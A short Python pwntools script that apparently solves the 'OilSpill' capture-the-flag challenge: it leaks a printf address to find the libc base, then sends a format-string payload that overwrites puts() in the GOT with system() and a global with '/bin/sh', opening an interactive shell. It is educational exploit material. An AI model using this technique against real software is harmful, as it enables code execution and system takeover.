#!/usr/bin/env python3

from pwn import *

if __name__ == '__main__':
    elf = context.binary = ELF('./OilSpill')

    io = process()
    # io = remote('oil.sdc.tf', 1337)
    out = io.recvuntil(b'do you have any ideas of what we can use to clean it?\n')
    addresses = [int(a, 16) for a in out.split(b'\n')[0].split(b',')[:4]]
    _, printf_addr, _, _ = addresses

    # We can use the address of printf() to calculate the base address of libc
    # since we know the offset from static analysis
    printf_offset = elf.libc.sym['printf']
    libc_base_addr = printf_addr - printf_offset

    # Overwrite the address of puts() to point to system() in the GOT
    # Also overwrite the value of the global variable 'x' to be /bin/sh
    # So we are effectively now calling system('/bin/sh')
    writes = {
        elf.got['puts']: libc_base_addr + elf.libc.sym['system'],
        elf.sym['x']: unpack(b'/bin/sh\0', 64, endian='little', sign=False),
    }
    # 8 is the first offset - we can confirm this by running the program and sending %p 8 times
    # We then see that the last one contains the bytes for %p itself (0x2570)
    payload = fmtstr_payload(8, writes)
    io.sendline(payload)

    io.interactive()
